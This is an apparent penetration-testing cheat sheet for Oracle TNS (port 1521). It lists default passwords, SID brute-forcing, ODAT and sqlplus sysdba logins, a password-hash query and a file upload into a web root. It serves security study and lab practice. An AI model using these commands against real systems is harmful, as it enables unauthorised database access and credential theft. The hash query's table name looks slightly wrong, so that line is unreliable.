# 1521 - Oracle TNS

## 1521 - Oracle TNS

Oracle TNS is often used with other Oracle services like Oracle DBSNMP, Oracle Databases, Oracle Application Server, Oracle Enterprise Manager, Oracle Fusion Middleware, web servers, and many more. Oracle 9 has a default password, `CHANGE_ON_INSTALL`, whereas Oracle 10 has no default password set. The Oracle DBSNMP service also uses a default password, `dbsnmp` that we should remember when we come across this one

When a client connects to an Oracle database, it specifies the database's `SID`along with its connection string. The client uses this `SID` to identify which database instance it wants to connect to. Suppose the client does not specify a `SID`. Then, the default value defined in the `tnsnames.ora` file is used. If the client specifies an incorrect `SID`, the connection attempt will fail

### Set up

Bash script to run to install everything we need to interact with the service

```sh
#!/bin/bash

sudo apt-get install libaio1 python3-dev alien -y
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init
git submodule update
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
export LD_LIBRARY_PATH=instantclient_21_12:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
sudo apt-get install build-essential libgmp-dev -y
pip3 install pycryptodome
```

{% embed url="https://www.geeksforgeeks.org/installation-guide/how-to-install-sqlplus-on-linux/" %}

### Service enumeration

#### Scan

```sh
sudo nmap -p1521 -sV <IP> --script oracle-sid-brute

./odat.py all -s <IP>
```

#### Service interaction

```sh
# Connect to the DB
sqlplus <USER>/<PASSWORD>@<IP>/<SID>

# Connect to the DB as DB admin
sqlplus <USER>/<PASSWORD>@<IP>/<SID> as sysdba
```

If we come across the following error sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory

```sh
# If we get the above error
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```

#### Syntax

Use single quotes in WHERE clause

```sh
# List tables
select table_name from all_tables;

# List user privs
select * from user_role_privs;

# Retreive password hashes
select name, password from sys.user
```

### File upload

We have to know the path to the web root for it to work

| **OS**  | **Default** p**ath** |
| ------- | -------------------- |
| Linux   | `/var/www/html`      |
| Windows | `C:\inetpub\wwwroot` |

```sh
# Test for file upload
echo "Oracle File Upload Test" > testing.txt
./odat.py utlfile -s <IP> -d <SID> -U <USER> -P <PASS> --sysdba --putFile <WEBSERVER_ROOT> <FILE> ./<FILE>
Ex : ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt

# Access the file
curl -X GET http://<IP>/<FILE>
```
